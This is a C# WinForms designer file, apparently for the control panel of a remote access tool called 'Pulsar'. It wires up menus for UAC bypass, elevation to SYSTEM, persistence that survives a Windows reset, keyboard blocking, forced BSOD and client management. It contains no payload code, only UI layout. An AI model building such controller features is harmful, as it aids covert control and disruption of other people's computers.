            funMethodsToolStripMenuItem.Text = "Fun Stuff";
            // 
            // bSODToolStripMenuItem
            // 
            bSODToolStripMenuItem.Image = Properties.Resources.nuclear;
            bSODToolStripMenuItem.Name = "bSODToolStripMenuItem";
            bSODToolStripMenuItem.Size = new Size(185, 22);
            bSODToolStripMenuItem.Text = "BSOD";
            bSODToolStripMenuItem.Click += bSODToolStripMenuItem_Click;
            // 
            // cWToolStripMenuItem
            // 
            cWToolStripMenuItem.Image = Properties.Resources.images;
            cWToolStripMenuItem.Name = "cWToolStripMenuItem";
            cWToolStripMenuItem.Size = new Size(185, 22);
            cWToolStripMenuItem.Text = "Change Wallpaper";
            cWToolStripMenuItem.Click += cWToolStripMenuItem_Click;
            // 
            // swapMouseButtonsToolStripMenuItem
            // 
            swapMouseButtonsToolStripMenuItem.Image = Properties.Resources.mouse;
            swapMouseButtonsToolStripMenuItem.Name = "swapMouseButtonsToolStripMenuItem";
            swapMouseButtonsToolStripMenuItem.Size = new Size(185, 22);
            swapMouseButtonsToolStripMenuItem.Text = "Swap Mouse Buttons";
            swapMouseButtonsToolStripMenuItem.Click += swapMouseButtonsToolStripMenuItem_Click;
            // 
            // hideTaskBarToolStripMenuItem
            // 
            hideTaskBarToolStripMenuItem.Image = Properties.Resources.cog;
            hideTaskBarToolStripMenuItem.Name = "hideTaskBarToolStripMenuItem";
            hideTaskBarToolStripMenuItem.Size = new Size(185, 22);
            hideTaskBarToolStripMenuItem.Text = "Hide Taskbar";
            hideTaskBarToolStripMenuItem.Click += hideTaskBarToolStripMenuItem_Click;
            // 
            // disableEnableKeyboardToolStripMenuItem
            // 
            disableEnableKeyboardToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { startToolStripMenuItem, stopToolStripMenuItem });
            disableEnableKeyboardToolStripMenuItem.Image = Properties.Resources.keyboardinput;
            disableEnableKeyboardToolStripMenuItem.Name = "disableEnableKeyboardToolStripMenuItem";
            disableEnableKeyboardToolStripMenuItem.Size = new Size(185, 22);
            disableEnableKeyboardToolStripMenuItem.Text = "Keyboard Blocker";
            // 
            // startToolStripMenuItem
            // 
            startToolStripMenuItem.Image = Properties.Resources.startbutton;
            startToolStripMenuItem.Name = "startToolStripMenuItem";
            startToolStripMenuItem.Size = new Size(98, 22);
            startToolStripMenuItem.Text = "Start";
            startToolStripMenuItem.Click += startToolStripMenuItem_Click;
            // 
            // stopToolStripMenuItem
            // 
            stopToolStripMenuItem.Image = Properties.Resources.stopbutton;
            stopToolStripMenuItem.Name = "stopToolStripMenuItem";
            stopToolStripMenuItem.Size = new Size(98, 22);
            stopToolStripMenuItem.Text = "Stop";
            stopToolStripMenuItem.Click += stopToolStripMenuItem_Click;
            // 
            // monitorsToolStripMenuItem
            // 
            monitorsToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { allOffToolStripMenuItem, allOnToolStripMenuItem });
            monitorsToolStripMenuItem.Image = Properties.Resources.monitoricon;
            monitorsToolStripMenuItem.Name = "monitorsToolStripMenuItem";
            monitorsToolStripMenuItem.Size = new Size(185, 22);
            monitorsToolStripMenuItem.Text = "Manage Monitors";
            // 
            // allOffToolStripMenuItem
            // 
            allOffToolStripMenuItem.Image = Properties.Resources.monitoron;
            allOffToolStripMenuItem.Name = "allOffToolStripMenuItem";
            allOffToolStripMenuItem.Size = new Size(108, 22);
            allOffToolStripMenuItem.Text = "All On";
            allOffToolStripMenuItem.Click += allOffToolStripMenuItem_Click;
            // 
            // allOnToolStripMenuItem
            // 
            allOnToolStripMenuItem.Image = Properties.Resources.monitoroff;
            allOnToolStripMenuItem.Name = "allOnToolStripMenuItem";
            allOnToolStripMenuItem.Size = new Size(108, 22);
            allOnToolStripMenuItem.Text = "All Off";
            allOnToolStripMenuItem.Click += allOnToolStripMenuItem_Click;
            // 
            // cDTrayToolStripMenuItem
            // 
            cDTrayToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { openToolStripMenuItem, closeToolStripMenuItem });
            cDTrayToolStripMenuItem.Image = Properties.Resources.cdplayer;
            cDTrayToolStripMenuItem.Name = "cDTrayToolStripMenuItem";
            cDTrayToolStripMenuItem.Size = new Size(185, 22);
            cDTrayToolStripMenuItem.Text = "CD Tray";
            // 
            // openToolStripMenuItem
            // 
            openToolStripMenuItem.Image = Properties.Resources.cdopen;
            openToolStripMenuItem.Name = "openToolStripMenuItem";
            openToolStripMenuItem.Size = new Size(103, 22);
            openToolStripMenuItem.Text = "Open";
            openToolStripMenuItem.Click += openToolStripMenuItem_Click;
            // 
            // closeToolStripMenuItem
            // 
            closeToolStripMenuItem.Image = Properties.Resources.cdclose;
            closeToolStripMenuItem.Name = "closeToolStripMenuItem";
            closeToolStripMenuItem.Size = new Size(103, 22);
            closeToolStripMenuItem.Text = "Close";
            closeToolStripMenuItem.Click += closeToolStripMenuItem_Click_1;
            // 
            // connectionToolStripMenuItem
            // 
            connectionToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { elevatedToolStripMenuItem, winREToolStripMenuItem, nicknameToolStripMenuItem, blockIPToolStripMenuItem, updateToolStripMenuItem, reconnectToolStripMenuItem, disconnectToolStripMenuItem, uninstallToolStripMenuItem });
            connectionToolStripMenuItem.Image = (Image)resources.GetObject("connectionToolStripMenuItem.Image");
            connectionToolStripMenuItem.Name = "connectionToolStripMenuItem";
            connectionToolStripMenuItem.Size = new Size(179, 22);
            connectionToolStripMenuItem.Text = "Client Management";
            // 
            // elevatedToolStripMenuItem
            // 
            elevatedToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { elevateClientPermissionsToolStripMenuItem, elevateToSystemToolStripMenuItem, deElevateFromSystemToolStripMenuItem, uACBypassToolStripMenuItem });
            elevatedToolStripMenuItem.Image = Properties.Resources.uac_shield;
            elevatedToolStripMenuItem.Name = "elevatedToolStripMenuItem";
            elevatedToolStripMenuItem.Size = new Size(133, 22);
            elevatedToolStripMenuItem.Text = "Elevated";
            // 
            // elevateClientPermissionsToolStripMenuItem
            // 
            elevateClientPermissionsToolStripMenuItem.Image = Properties.Resources.uac_shield;
            elevateClientPermissionsToolStripMenuItem.Name = "elevateClientPermissionsToolStripMenuItem";
            elevateClientPermissionsToolStripMenuItem.Size = new Size(211, 22);
            elevateClientPermissionsToolStripMenuItem.Text = "Elevate Client Permissions";
            elevateClientPermissionsToolStripMenuItem.Click += elevateClientPermissionsToolStripMenuItem_Click;
            // 
            // elevateToSystemToolStripMenuItem
            // 
            elevateToSystemToolStripMenuItem.Image = Properties.Resources.uac_shield;
            elevateToSystemToolStripMenuItem.Name = "elevateToSystemToolStripMenuItem";
            elevateToSystemToolStripMenuItem.Size = new Size(211, 22);
            elevateToSystemToolStripMenuItem.Text = "Elevate to System";
            elevateToSystemToolStripMenuItem.Click += elevateToSystemToolStripMenuItem_Click;
            // 
            // deElevateFromSystemToolStripMenuItem
            // 
            deElevateFromSystemToolStripMenuItem.Image = Properties.Resources.uac_shield;
            deElevateFromSystemToolStripMenuItem.Name = "deElevateFromSystemToolStripMenuItem";
            deElevateFromSystemToolStripMenuItem.Size = new Size(211, 22);
            deElevateFromSystemToolStripMenuItem.Text = "DeElevate From System";
            deElevateFromSystemToolStripMenuItem.Click += deElevateToolStripMenuItem_Click;
            // 
            // uACBypassToolStripMenuItem
            // 
            uACBypassToolStripMenuItem.Image = Properties.Resources.uac_shield;
            uACBypassToolStripMenuItem.Name = "uACBypassToolStripMenuItem";
            uACBypassToolStripMenuItem.Size = new Size(211, 22);
            uACBypassToolStripMenuItem.Text = "UAC Bypass";
            uACBypassToolStripMenuItem.Click += uACBypassToolStripMenuItem_Click;
            // 
            // winREToolStripMenuItem
            // 
            winREToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { installWinresetSurvivalToolStripMenuItem, removeWinresetSurvivalToolStripMenuItem, winRECustomFileForSurvivalToolStripMenuItem });
            winREToolStripMenuItem.Image = Properties.Resources.anchor;
            winREToolStripMenuItem.Name = "winREToolStripMenuItem";
            winREToolStripMenuItem.Size = new Size(133, 22);
            winREToolStripMenuItem.Text = "WinRE";
            // 
            // installWinresetSurvivalToolStripMenuItem
            // 
            installWinresetSurvivalToolStripMenuItem.Image = Properties.Resources.anchor;
            installWinresetSurvivalToolStripMenuItem.Name = "installWinresetSurvivalToolStripMenuItem";
            installWinresetSurvivalToolStripMenuItem.Size = new Size(216, 22);
            installWinresetSurvivalToolStripMenuItem.Text = "Install Winreset Survival";
            installWinresetSurvivalToolStripMenuItem.Click += installWinresetSurvivalToolStripMenuItem_Click;
            // 
            // removeWinresetSurvivalToolStripMenuItem
            // 
            removeWinresetSurvivalToolStripMenuItem.Image = Properties.Resources.anchor;
            removeWinresetSurvivalToolStripMenuItem.Name = "removeWinresetSurvivalToolStripMenuItem";
            removeWinresetSurvivalToolStripMenuItem.Size = new Size(216, 22);
            removeWinresetSurvivalToolStripMenuItem.Text = "Remove Winreset Survival";
            removeWinresetSurvivalToolStripMenuItem.Click += removeWinresetSurvivalToolStripMenuItem_Click;
            // 
            // winRECustomFileForSurvivalToolStripMenuItem
            // 
            winRECustomFileForSurvivalToolStripMenuItem.Image = Properties.Resources.folder;
            winRECustomFileForSurvivalToolStripMenuItem.Name = "winRECustomFileForSurvivalToolStripMenuItem";
            winRECustomFileForSurvivalToolStripMenuItem.Size = new Size(216, 22);
            winRECustomFileForSurvivalToolStripMenuItem.Text = "Custom file WinRE Survival";
            winRECustomFileForSurvivalToolStripMenuItem.Click += winRECustomFileForSurvivalToolStripMenuItem_Click;
            // 
            // nicknameToolStripMenuItem
            // 
            nicknameToolStripMenuItem.Image = Properties.Resources.textfield_rename;
            nicknameToolStripMenuItem.Name = "nicknameToolStripMenuItem";
            nicknameToolStripMenuItem.Size = new Size(133, 22);
            nicknameToolStripMenuItem.Text = "Nickname";
            nicknameToolStripMenuItem.Click += nicknameToolStripMenuItem_Click;
            // 
            // blockIPToolStripMenuItem
            // 
            blockIPToolStripMenuItem.Image = Properties.Resources.delete;
            blockIPToolStripMenuItem.Name = "blockIPToolStripMenuItem";
            blockIPToolStripMenuItem.Size = new Size(133, 22);
            blockIPToolStripMenuItem.Text = "Block IP";
            blockIPToolStripMenuItem.Click += blockIPToolStripMenuItem_Click;
            // 
            // updateToolStripMenuItem
            // 
            updateToolStripMenuItem.Image = (Image)resources.GetObject("updateToolStripMenuItem.Image");
            updateToolStripMenuItem.Name = "updateToolStripMenuItem";
            updateToolStripMenuItem.Size = new Size(133, 22);
            updateToolStripMenuItem.Text = "Update";
            updateToolStripMenuItem.Click += updateToolStripMenuItem_Click;
            // 
            // reconnectToolStripMenuItem
            // 
            reconnectToolStripMenuItem.Image = (Image)resources.GetObject("reconnectToolStripMenuItem.Image");
            reconnectToolStripMenuItem.Name = "reconnectToolStripMenuItem";
            reconnectToolStripMenuItem.Size = new Size(133, 22);
            reconnectToolStripMenuItem.Text = "Reconnect";
            reconnectToolStripMenuItem.Click += reconnectToolStripMenuItem_Click;
            // 
            // disconnectToolStripMenuItem
            // 
            disconnectToolStripMenuItem.Image = (Image)resources.GetObject("disconnectToolStripMenuItem.Image");
            disconnectToolStripMenuItem.Name = "disconnectToolStripMenuItem";
            disconnectToolStripMenuItem.Size = new Size(133, 22);
            disconnectToolStripMenuItem.Text = "Disconnect";
            disconnectToolStripMenuItem.Click += disconnectToolStripMenuItem_Click;
            // 
            // uninstallToolStripMenuItem
            // 
            uninstallToolStripMenuItem.Image = (Image)resources.GetObject("uninstallToolStripMenuItem.Image");
            uninstallToolStripMenuItem.Name = "uninstallToolStripMenuItem";
            uninstallToolStripMenuItem.Size = new Size(133, 22);
            uninstallToolStripMenuItem.Text = "Uninstall";
            uninstallToolStripMenuItem.Click += uninstallToolStripMenuItem_Click;
            // 
            // lineToolStripMenuItem
            // 
            lineToolStripMenuItem.Name = "lineToolStripMenuItem";
            lineToolStripMenuItem.Size = new Size(176, 6);
            // 
            // openClientFolderToolStripMenuItem
            // 
            openClientFolderToolStripMenuItem.Image = Properties.Resources.lovefolder;
            openClientFolderToolStripMenuItem.Name = "openClientFolderToolStripMenuItem";
            openClientFolderToolStripMenuItem.Size = new Size(179, 22);
            openClientFolderToolStripMenuItem.Text = "Open Client Folder";
            openClientFolderToolStripMenuItem.Click += openClientFolderToolStripMenuItem_Click;
            // 
            // selectAllToolStripMenuItem
            // 
            selectAllToolStripMenuItem.Image = Properties.Resources.selectall;
            selectAllToolStripMenuItem.Name = "selectAllToolStripMenuItem";
            selectAllToolStripMenuItem.Size = new Size(179, 22);
            selectAllToolStripMenuItem.Text = "Select All Clients";
            selectAllToolStripMenuItem.Click += selectAllToolStripMenuItem_Click;
            // 
            // pluginManagerToolStripMenuItem
            // 
            pluginManagerToolStripMenuItem.Image = Properties.Resources.cog_add;
            pluginManagerToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            pluginManagerToolStripMenuItem.Name = "pluginManagerToolStripMenuItem";
            pluginManagerToolStripMenuItem.Size = new Size(119, 21);
            pluginManagerToolStripMenuItem.Text = "Plugin Manager";
            pluginManagerToolStripMenuItem.Click += pluginManagerToolStripMenuItem_Click;
            // 
            // imgFlags
            // 
            imgFlags.ColorDepth = ColorDepth.Depth8Bit;
            imgFlags.ImageStream = (ImageListStreamer)resources.GetObject("imgFlags.ImageStream");
            imgFlags.TransparentColor = Color.Transparent;
            imgFlags.Images.SetKeyName(0, "ad.png");
            imgFlags.Images.SetKeyName(1, "ae.png");
            imgFlags.Images.SetKeyName(2, "af.png");
            imgFlags.Images.SetKeyName(3, "ag.png");
            imgFlags.Images.SetKeyName(4, "ai.png");
            imgFlags.Images.SetKeyName(5, "al.png");
            imgFlags.Images.SetKeyName(6, "am.png");
            imgFlags.Images.SetKeyName(7, "an.png");
            imgFlags.Images.SetKeyName(8, "ao.png");
            imgFlags.Images.SetKeyName(9, "ar.png");
            imgFlags.Images.SetKeyName(10, "as.png");
            imgFlags.Images.SetKeyName(11, "at.png");
            imgFlags.Images.SetKeyName(12, "au.png");
            imgFlags.Images.SetKeyName(13, "aw.png");
            imgFlags.Images.SetKeyName(14, "ax.png");
            imgFlags.Images.SetKeyName(15, "az.png");
            imgFlags.Images.SetKeyName(16, "ba.png");
            imgFlags.Images.SetKeyName(17, "bb.png");
            imgFlags.Images.SetKeyName(18, "bd.png");
            imgFlags.Images.SetKeyName(19, "be.png");
            imgFlags.Images.SetKeyName(20, "bf.png");
            imgFlags.Images.SetKeyName(21, "bg.png");
            imgFlags.Images.SetKeyName(22, "bh.png");
            imgFlags.Images.SetKeyName(23, "bi.png");
            imgFlags.Images.SetKeyName(24, "bj.png");
            imgFlags.Images.SetKeyName(25, "bm.png");
            imgFlags.Images.SetKeyName(26, "bn.png");
            imgFlags.Images.SetKeyName(27, "bo.png");
            imgFlags.Images.SetKeyName(28, "br.png");
            imgFlags.Images.SetKeyName(29, "bs.png");
            imgFlags.Images.SetKeyName(30, "bt.png");
            imgFlags.Images.SetKeyName(31, "bv.png");
            imgFlags.Images.SetKeyName(32, "bw.png");
            imgFlags.Images.SetKeyName(33, "by.png");
            imgFlags.Images.SetKeyName(34, "bz.png");
            imgFlags.Images.SetKeyName(35, "ca.png");
            imgFlags.Images.SetKeyName(36, "catalonia.png");
            imgFlags.Images.SetKeyName(37, "cc.png");
            imgFlags.Images.SetKeyName(38, "cd.png");
            imgFlags.Images.SetKeyName(39, "cf.png");
            imgFlags.Images.SetKeyName(40, "cg.png");
            imgFlags.Images.SetKeyName(41, "ch.png");
            imgFlags.Images.SetKeyName(42, "ci.png");
            imgFlags.Images.SetKeyName(43, "ck.png");
            imgFlags.Images.SetKeyName(44, "cl.png");
            imgFlags.Images.SetKeyName(45, "cm.png");
            imgFlags.Images.SetKeyName(46, "cn.png");
            imgFlags.Images.SetKeyName(47, "co.png");
            imgFlags.Images.SetKeyName(48, "cr.png");
            imgFlags.Images.SetKeyName(49, "cs.png");
            imgFlags.Images.SetKeyName(50, "cu.png");
            imgFlags.Images.SetKeyName(51, "cv.png");
            imgFlags.Images.SetKeyName(52, "cx.png");
            imgFlags.Images.SetKeyName(53, "cy.png");
            imgFlags.Images.SetKeyName(54, "cz.png");
            imgFlags.Images.SetKeyName(55, "de.png");
            imgFlags.Images.SetKeyName(56, "dj.png");
            imgFlags.Images.SetKeyName(57, "dk.png");
            imgFlags.Images.SetKeyName(58, "dm.png");
            imgFlags.Images.SetKeyName(59, "do.png");
            imgFlags.Images.SetKeyName(60, "dz.png");
            imgFlags.Images.SetKeyName(61, "ec.png");
            imgFlags.Images.SetKeyName(62, "ee.png");
            imgFlags.Images.SetKeyName(63, "eg.png");
            imgFlags.Images.SetKeyName(64, "eh.png");
            imgFlags.Images.SetKeyName(65, "england.png");
            imgFlags.Images.SetKeyName(66, "er.png");
            imgFlags.Images.SetKeyName(67, "es.png");
            imgFlags.Images.SetKeyName(68, "et.png");
            imgFlags.Images.SetKeyName(69, "europeanunion.png");
            imgFlags.Images.SetKeyName(70, "fam.png");
            imgFlags.Images.SetKeyName(71, "fi.png");
            imgFlags.Images.SetKeyName(72, "fj.png");
            imgFlags.Images.SetKeyName(73, "fk.png");
            imgFlags.Images.SetKeyName(74, "fm.png");
            imgFlags.Images.SetKeyName(75, "fo.png");
            imgFlags.Images.SetKeyName(76, "fr.png");
            imgFlags.Images.SetKeyName(77, "ga.png");
            imgFlags.Images.SetKeyName(78, "gb.png");
            imgFlags.Images.SetKeyName(79, "gd.png");
            imgFlags.Images.SetKeyName(80, "ge.png");
            imgFlags.Images.SetKeyName(81, "gf.png");
            imgFlags.Images.SetKeyName(82, "gh.png");
            imgFlags.Images.SetKeyName(83, "gi.png");
            imgFlags.Images.SetKeyName(84, "gl.png");
            imgFlags.Images.SetKeyName(85, "gm.png");
            imgFlags.Images.SetKeyName(86, "gn.png");
            imgFlags.Images.SetKeyName(87, "gp.png");
            imgFlags.Images.SetKeyName(88, "gq.png");
            imgFlags.Images.SetKeyName(89, "gr.png");
            imgFlags.Images.SetKeyName(90, "gs.png");
            imgFlags.Images.SetKeyName(91, "gt.png");
            imgFlags.Images.SetKeyName(92, "gu.png");
            imgFlags.Images.SetKeyName(93, "gw.png");
            imgFlags.Images.SetKeyName(94, "gy.png");
            imgFlags.Images.SetKeyName(95, "hk.png");
            imgFlags.Images.SetKeyName(96, "hm.png");
            imgFlags.Images.SetKeyName(97, "hn.png");
            imgFlags.Images.SetKeyName(98, "hr.png");
            imgFlags.Images.SetKeyName(99, "ht.png");
            imgFlags.Images.SetKeyName(100, "hu.png");
            imgFlags.Images.SetKeyName(101, "id.png");
            imgFlags.Images.SetKeyName(102, "ie.png");
            imgFlags.Images.SetKeyName(103, "il.png");
            imgFlags.Images.SetKeyName(104, "in.png");
            imgFlags.Images.SetKeyName(105, "io.png");
            imgFlags.Images.SetKeyName(106, "iq.png");
            imgFlags.Images.SetKeyName(107, "ir.png");
            imgFlags.Images.SetKeyName(108, "is.png");
            imgFlags.Images.SetKeyName(109, "it.png");
            imgFlags.Images.SetKeyName(110, "jm.png");
            imgFlags.Images.SetKeyName(111, "jo.png");
            imgFlags.Images.SetKeyName(112, "jp.png");
            imgFlags.Images.SetKeyName(113, "ke.png");
            imgFlags.Images.SetKeyName(114, "kg.png");
            imgFlags.Images.SetKeyName(115, "kh.png");
            imgFlags.Images.SetKeyName(116, "ki.png");
            imgFlags.Images.SetKeyName(117, "km.png");
            imgFlags.Images.SetKeyName(118, "kn.png");
            imgFlags.Images.SetKeyName(119, "kp.png");
            imgFlags.Images.SetKeyName(120, "kr.png");
            imgFlags.Images.SetKeyName(121, "kw.png");
            imgFlags.Images.SetKeyName(122, "ky.png");
            imgFlags.Images.SetKeyName(123, "kz.png");
            imgFlags.Images.SetKeyName(124, "la.png");
            imgFlags.Images.SetKeyName(125, "lb.png");
            imgFlags.Images.SetKeyName(126, "lc.png");
            imgFlags.Images.SetKeyName(127, "li.png");
            imgFlags.Images.SetKeyName(128, "lk.png");
            imgFlags.Images.SetKeyName(129, "lr.png");
            imgFlags.Images.SetKeyName(130, "ls.png");
            imgFlags.Images.SetKeyName(131, "lt.png");
            imgFlags.Images.SetKeyName(132, "lu.png");
            imgFlags.Images.SetKeyName(133, "lv.png");
            imgFlags.Images.SetKeyName(134, "ly.png");
            imgFlags.Images.SetKeyName(135, "ma.png");
            imgFlags.Images.SetKeyName(136, "mc.png");
            imgFlags.Images.SetKeyName(137, "md.png");
            imgFlags.Images.SetKeyName(138, "me.png");
            imgFlags.Images.SetKeyName(139, "mg.png");
            imgFlags.Images.SetKeyName(140, "mh.png");
            imgFlags.Images.SetKeyName(141, "mk.png");
            imgFlags.Images.SetKeyName(142, "ml.png");
            imgFlags.Images.SetKeyName(143, "mm.png");
            imgFlags.Images.SetKeyName(144, "mn.png");
            imgFlags.Images.SetKeyName(145, "mo.png");
            imgFlags.Images.SetKeyName(146, "mp.png");
            imgFlags.Images.SetKeyName(147, "mq.png");
            imgFlags.Images.SetKeyName(148, "mr.png");
            imgFlags.Images.SetKeyName(149, "ms.png");
            imgFlags.Images.SetKeyName(150, "mt.png");
            imgFlags.Images.SetKeyName(151, "mu.png");
            imgFlags.Images.SetKeyName(152, "mv.png");
            imgFlags.Images.SetKeyName(153, "mw.png");
            imgFlags.Images.SetKeyName(154, "mx.png");
            imgFlags.Images.SetKeyName(155, "my.png");
            imgFlags.Images.SetKeyName(156, "mz.png");
            imgFlags.Images.SetKeyName(157, "na.png");
            imgFlags.Images.SetKeyName(158, "nc.png");
            imgFlags.Images.SetKeyName(159, "ne.png");
            imgFlags.Images.SetKeyName(160, "nf.png");
            imgFlags.Images.SetKeyName(161, "ng.png");
            imgFlags.Images.SetKeyName(162, "ni.png");
            imgFlags.Images.SetKeyName(163, "nl.png");
            imgFlags.Images.SetKeyName(164, "no.png");
            imgFlags.Images.SetKeyName(165, "np.png");
            imgFlags.Images.SetKeyName(166, "nr.png");
            imgFlags.Images.SetKeyName(167, "nu.png");
            imgFlags.Images.SetKeyName(168, "nz.png");
            imgFlags.Images.SetKeyName(169, "om.png");
            imgFlags.Images.SetKeyName(170, "pa.png");
            imgFlags.Images.SetKeyName(171, "pe.png");
            imgFlags.Images.SetKeyName(172, "pf.png");
            imgFlags.Images.SetKeyName(173, "pg.png");
            imgFlags.Images.SetKeyName(174, "ph.png");
            imgFlags.Images.SetKeyName(175, "pk.png");
            imgFlags.Images.SetKeyName(176, "pl.png");
            imgFlags.Images.SetKeyName(177, "pm.png");
            imgFlags.Images.SetKeyName(178, "pn.png");
            imgFlags.Images.SetKeyName(179, "pr.png");
            imgFlags.Images.SetKeyName(180, "ps.png");
            imgFlags.Images.SetKeyName(181, "pt.png");
            imgFlags.Images.SetKeyName(182, "pw.png");
            imgFlags.Images.SetKeyName(183, "py.png");
            imgFlags.Images.SetKeyName(184, "qa.png");
            imgFlags.Images.SetKeyName(185, "re.png");
            imgFlags.Images.SetKeyName(186, "ro.png");
            imgFlags.Images.SetKeyName(187, "rs.png");
            imgFlags.Images.SetKeyName(188, "ru.png");
            imgFlags.Images.SetKeyName(189, "rw.png");
            imgFlags.Images.SetKeyName(190, "sa.png");
            imgFlags.Images.SetKeyName(191, "sb.png");
            imgFlags.Images.SetKeyName(192, "sc.png");
            imgFlags.Images.SetKeyName(193, "scotland.png");
            imgFlags.Images.SetKeyName(194, "sd.png");
            imgFlags.Images.SetKeyName(195, "se.png");
            imgFlags.Images.SetKeyName(196, "sg.png");
            imgFlags.Images.SetKeyName(197, "sh.png");
            imgFlags.Images.SetKeyName(198, "si.png");
            imgFlags.Images.SetKeyName(199, "sj.png");
            imgFlags.Images.SetKeyName(200, "sk.png");
            imgFlags.Images.SetKeyName(201, "sl.png");
            imgFlags.Images.SetKeyName(202, "sm.png");
            imgFlags.Images.SetKeyName(203, "sn.png");
            imgFlags.Images.SetKeyName(204, "so.png");
            imgFlags.Images.SetKeyName(205, "sr.png");
            imgFlags.Images.SetKeyName(206, "st.png");
            imgFlags.Images.SetKeyName(207, "sv.png");
            imgFlags.Images.SetKeyName(208, "sy.png");
            imgFlags.Images.SetKeyName(209, "sz.png");
            imgFlags.Images.SetKeyName(210, "tc.png");
            imgFlags.Images.SetKeyName(211, "td.png");
            imgFlags.Images.SetKeyName(212, "tf.png");
            imgFlags.Images.SetKeyName(213, "tg.png");
            imgFlags.Images.SetKeyName(214, "th.png");
            imgFlags.Images.SetKeyName(215, "tj.png");
            imgFlags.Images.SetKeyName(216, "tk.png");
            imgFlags.Images.SetKeyName(217, "tl.png");
            imgFlags.Images.SetKeyName(218, "tm.png");
            imgFlags.Images.SetKeyName(219, "tn.png");
            imgFlags.Images.SetKeyName(220, "to.png");
            imgFlags.Images.SetKeyName(221, "tr.png");
            imgFlags.Images.SetKeyName(222, "tt.png");
            imgFlags.Images.SetKeyName(223, "tv.png");
            imgFlags.Images.SetKeyName(224, "tw.png");
            imgFlags.Images.SetKeyName(225, "tz.png");
            imgFlags.Images.SetKeyName(226, "ua.png");
            imgFlags.Images.SetKeyName(227, "ug.png");
            imgFlags.Images.SetKeyName(228, "um.png");
            imgFlags.Images.SetKeyName(229, "us.png");
            imgFlags.Images.SetKeyName(230, "uy.png");
            imgFlags.Images.SetKeyName(231, "uz.png");
            imgFlags.Images.SetKeyName(232, "va.png");
            imgFlags.Images.SetKeyName(233, "vc.png");
            imgFlags.Images.SetKeyName(234, "ve.png");
            imgFlags.Images.SetKeyName(235, "vg.png");
            imgFlags.Images.SetKeyName(236, "vi.png");
            imgFlags.Images.SetKeyName(237, "vn.png");
            imgFlags.Images.SetKeyName(238, "vu.png");
            imgFlags.Images.SetKeyName(239, "wales.png");
            imgFlags.Images.SetKeyName(240, "wf.png");
            imgFlags.Images.SetKeyName(241, "ws.png");
            imgFlags.Images.SetKeyName(242, "ye.png");
            imgFlags.Images.SetKeyName(243, "yt.png");
            imgFlags.Images.SetKeyName(244, "za.png");
            imgFlags.Images.SetKeyName(245, "zm.png");
            imgFlags.Images.SetKeyName(246, "zw.png");
            imgFlags.Images.SetKeyName(247, "xy.png");
            // 
            // notifyIcon
            // 
            notifyIcon.Icon = (Icon)resources.GetObject("notifyIcon.Icon");
            notifyIcon.Text = "Pulsar";
            notifyIcon.Visible = true;
            notifyIcon.MouseDoubleClick += notifyIcon_MouseDoubleClick;
            // 
            // tableLayoutPanel
            // 
            tableLayoutPanel.ColumnCount = 1;
            tableLayoutPanel.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 100F));
            tableLayoutPanel.Controls.Add(MainTabControl, 0, 1);
            tableLayoutPanel.Controls.Add(statusStrip, 0, 2);
            tableLayoutPanel.Controls.Add(menuStrip, 0, 0);
            tableLayoutPanel.Dock = DockStyle.Fill;
            tableLayoutPanel.GrowStyle = TableLayoutPanelGrowStyle.FixedSize;
            tableLayoutPanel.Location = new Point(0, 0);
            tableLayoutPanel.Name = "tableLayoutPanel";
            tableLayoutPanel.RowCount = 3;
            tableLayoutPanel.RowStyles.Add(new RowStyle(SizeType.Absolute, 25F));
            tableLayoutPanel.RowStyles.Add(new RowStyle(SizeType.Percent, 100F));
            tableLayoutPanel.RowStyles.Add(new RowStyle(SizeType.Absolute, 22F));
            tableLayoutPanel.Size = new Size(1144, 538);
            tableLayoutPanel.TabIndex = 6;
            // 
            // MainTabControl
            // 
            MainTabControl.Controls.Add(tabOfflineClients);
            MainTabControl.Controls.Add(tabStats);
            MainTabControl.Controls.Add(tabPage1);
            MainTabControl.Controls.Add(tabHeatMap);
            MainTabControl.Controls.Add(tabPage2);
            MainTabControl.Controls.Add(tabPage3);
            MainTabControl.Controls.Add(tabPage4);
            MainTabControl.Dock = DockStyle.Fill;
            MainTabControl.Location = new Point(0, 25);
            MainTabControl.Margin = new Padding(0);
            MainTabControl.Name = "MainTabControl";
            MainTabControl.SelectedIndex = 2;
            MainTabControl.Size = new Size(1144, 491);
            MainTabControl.TabIndex = 7;
            MainTabControl.SelectedIndexChanged += MainTabControl_SelectedIndexChanged;
            // 
            // tabOfflineClients
            // 
            tabOfflineClients.Controls.Add(lstOfflineClients);
            tabOfflineClients.Location = new Point(4, 22);
            tabOfflineClients.Margin = new Padding(0);
            tabOfflineClients.Name = "tabOfflineClients";
            tabOfflineClients.Size = new Size(1136, 465);
            tabOfflineClients.TabIndex = 0;
            tabOfflineClients.Text = "Offline";
            tabOfflineClients.UseVisualStyleBackColor = true;
            // 
            // lstOfflineClients
            // 
            lstOfflineClients.Columns.AddRange(new ColumnHeader[] { hOfflineIP, hOfflineNickname, hOfflineTag, hOfflineUserPC, hOfflineVersion, hOfflineLastSeen, hOfflineFirstSeen, hOfflineCountry, hOfflineOS, hOfflineAccountType });
            lstOfflineClients.ContextMenuStrip = OfflineClientsContextMenuStrip;
            lstOfflineClients.Dock = DockStyle.Fill;
            lstOfflineClients.Font = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point, 0);
            lstOfflineClients.FullRowSelect = true;
            lstOfflineClients.Location = new Point(0, 0);
            lstOfflineClients.Name = "lstOfflineClients";
            lstOfflineClients.ShowItemToolTips = true;
            lstOfflineClients.Size = new Size(1136, 465);
            lstOfflineClients.SmallImageList = imgFlags;
            lstOfflineClients.TabIndex = 0;
            lstOfflineClients.UseCompatibleStateImageBehavior = false;
            lstOfflineClients.View = View.Details;
            // 
            // hOfflineIP
            // 
            hOfflineIP.Text = "IP Address";
            hOfflineIP.Width = 120;
            // 
            // hOfflineNickname
            // 
            hOfflineNickname.Text = "Nickname";
            hOfflineNickname.Width = 140;
            // 
            // hOfflineTag
            // 
            hOfflineTag.Text = "Tag";
            hOfflineTag.Width = 100;
            // 
            // hOfflineUserPC
            // 
            hOfflineUserPC.Text = "User@PC";
